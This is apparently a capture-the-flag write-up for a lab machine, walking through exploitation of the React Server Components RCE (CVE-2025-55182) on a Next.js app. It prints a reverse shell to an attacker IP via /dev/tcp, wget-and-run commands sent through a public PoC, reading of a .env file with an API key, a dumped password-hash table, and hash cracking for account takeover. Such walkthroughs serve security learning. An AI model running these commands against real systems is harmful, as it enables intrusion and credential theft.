# React Server Components RCE (CVE-2025-55182)

## Identify and confirm the exposed app

In Reactor, the service on TCP `3000` returned `X-Powered-By: Next.js` and served assets under `/_next/static/`. Those observations led to testing [React2Shell](https://react.dev/blog/2025/12/03/critical-security-vulnerability-in-react-server-components); the technology fingerprint alone did not establish exploitation.

```bash
nmap -sC -sV 10.129.245.214 -p- -oA nmap/nmap.full
feroxbuster -u http://10.129.245.214:3000/ -Eg -t 10 -w /md/wl/raft-small-directories.txt
```

The [React2Shell async scanner](https://github.com/InferiorAK/CVE-2025-55182-React2Shell-Async-Scanner) reported Next.js `15.0.3` and RCE. The [separate PoC](https://github.com/jensnesten/React2Shell-PoC) then confirmed command execution as the `node` account:

```bash
git clone https://github.com/InferiorAK/CVE-2025-55182-React2Shell-Async-Scanner.git
python3 CVE-2025-55182_scanner.py -u http://10.129.245.214:3000/
git clone https://github.com/jensnesten/React2Shell-PoC.git
python3 main.py http://10.129.245.214:3000/ id
```

```text
uid=999(node) gid=988(node) groups=988(node)
```

## Establish a shell

The PoC accepted commands that downloaded and executed a shell script. The observed script opened a reverse shell:

```bash
cat > shell.sh <<'EOF'
#!/bin/bash
sh -i >& /dev/tcp/10.10.14.213/80 0>&1
EOF
python3 -m http.server
```

Start `nc -nlvp 80` in another terminal, then use the PoC:

```bash
python3 main.py http://10.129.245.214:3000/ 'wget -O /tmp/shell.sh http://10.10.14.213:8000/shell.sh'
python3 main.py http://10.129.245.214:3000/ 'chmod 777 /tmp/shell.sh'
python3 main.py http://10.129.245.214:3000/ '/tmp/shell.sh'
```

The listener received a shell as `node`.

## Recover a local account from the app database

The `node` shell's environment and `/opt/reactor-app/.env` identified `DB_PATH=/opt/reactor-app/reactor.db`. The same file exposed `SENSOR_API_KEY=rw_sk_7f8a9b2c3d4e5f6g7h8i9j0k` and `ALERT_WEBHOOK=https://alerts.internal.reactor.htb/webhook`. Inspecting the SQLite database exposed account hashes:

```bash
cat /opt/reactor-app/.env
cd /opt/reactor-app
sqlite3 reactor.db
.tables
select * from users;
```

```text
sensor_logs  users
1|admin|a203b22191d744a4e70ada5c101b17b8|administrator|admin@reactor.htb
2|engineer|39d97110eafe2a9a68639812cd271e8e|operator|engineer@reactor.htb
```

Hashcat mode `0` recovered `reactor1` from the engineer hash:

```bash
hashcat -a0 -m 0 39d97110eafe2a9a68639812cd271e8e /opt/rockyou.txt
```

Use the recovered password for `su` on the target:

```bash
su engineer
```

The attacker-side hosts entry from the notes mapped the SSH hostname:

```text
10.129.245.214 alerts.internal.reactor.htb reactor.htb
```

SSH then worked from the attacker machine:

```bash
ssh engineer@reactor.htb
```

The engineer account was then used for the [Node inspector privilege escalation](../linux-privilege-escalation/node-inspector.md).
